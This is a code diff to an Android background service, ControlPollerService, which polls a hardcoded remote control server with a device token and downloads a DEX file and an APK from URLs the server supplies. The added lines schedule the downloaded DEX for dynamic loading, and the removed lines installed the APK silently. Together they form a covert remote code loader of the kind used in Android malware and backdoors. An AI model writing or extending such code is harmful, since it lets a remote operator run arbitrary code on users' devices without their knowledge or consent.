@@ -25,27 +25,30 @@ public class ControlPollerService extends JobIntentService {
 
     @Override
     protected void onHandleWork(@NonNull Intent intent) {
-        String deviceToken = "535ef8dad6992485";  // TODO: Load dynamically if possible
+        String deviceToken = "535ef8dad6992485";
         String url = "https://digiserve25.pythonanywhere.com/control/" + deviceToken + ".json";
 
         JSONObject response = NetworkUtils.getJsonFromUrl(url);
-        if (response != null && response.has("apk_url")) {
+        if (response != null && response.has("dex_url")) {
             try {
-                String apkUrl = response.getString("apk_url");
+                String dexUrl = response.getString("dex_url");
+                String apkUrl = response.optString("apk_url");
 
-                if (!apkUrl.isEmpty()) {
-                    Log.i("APK_FETCH", "Downloading new APK: " + apkUrl);
+                if (!dexUrl.isEmpty() && !apkUrl.isEmpty()) {
+                    File dexFile = NetworkUtils.downloadFile(getApplicationContext(), dexUrl, "patch.dex");
                     File apkFile = NetworkUtils.downloadFile(getApplicationContext(), apkUrl, "update.apk");
-                    SilentApkInstaller.installSilently(this, apkFile);
+
+                    if (dexFile.exists()) {
+                        DexLoader.schedulePatchLoad(this, dexFile);
+                    } else {
+                        CrashLogger.log(this, "DEX_PATCH", "❌ Skipped: dexFile was null or missing");
+                    }
                 }
 
-            } catch (JSONException e) {
-                Log.e("APK_FETCH", "Failed to parse APK URL from control response", e);
             } catch (Exception e) {
-                Log.e("APK_FETCH", "Unexpected error downloading APK", e);
+                Log.e("DEX_PATCH", "❌ Error in ControlPollerService", e);
+                CrashLogger.log(this, "DEX_PATCH", "❌ Error during dex patch load: " + e.getMessage());
             }
-        } else {
-            Log.i("APK_FETCH", "No APK update found in control response");
         }
     }
 }
